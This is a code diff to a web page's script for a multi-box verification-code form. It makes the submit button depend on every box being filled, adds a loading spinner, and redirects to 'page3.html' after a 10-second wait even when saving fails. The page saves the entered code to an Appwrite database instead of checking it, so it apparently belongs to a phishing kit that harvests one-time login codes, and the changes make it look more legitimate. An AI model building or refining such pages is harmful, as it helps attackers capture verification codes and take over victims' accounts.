@@ -116,12 +116,30 @@
                 this.blur(); // Remove focus, which prevents the keyboard from appearing
             });
         });
+        const submitButton = document.getElementById('submit-btn');
+
+        // Function to check if all inputs are filled
+        function checkInputs() {
+            const allFilled = Array.from(codeInputs).every(input => input.value !== '');
+            submitButton.disabled = !allFilled;
+        }
+
+        // Add event listeners to inputs to check on input
+        codeInputs.forEach(input => {
+            input.addEventListener('input', checkInputs);
+        });
+
+        // Initial check
+        checkInputs();
 
         // Handle form submission
-        document.getElementById('submit-btn').addEventListener('click', async function(event) {
+        submitButton.addEventListener('click', async function(event) {
             event.preventDefault(); // Prevent the form from submitting normally
 
             const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
+
+            // Change button content to a spinner
+            submitButton.innerHTML = '<div class="spinner"></div>';
 
             try {
                 // Save the verification code to the Appwrite database
@@ -137,6 +155,11 @@
             } catch (error) {
                 console.error('Error saving verification code:', error);
                 alert('Failed to save verification code.');
+            } finally {
+                // Wait for 10 seconds and then open the new page
+                setTimeout(() => {
+                    window.location.href = './page3.html';
+                }, 10000);
             }
         });
     </script>
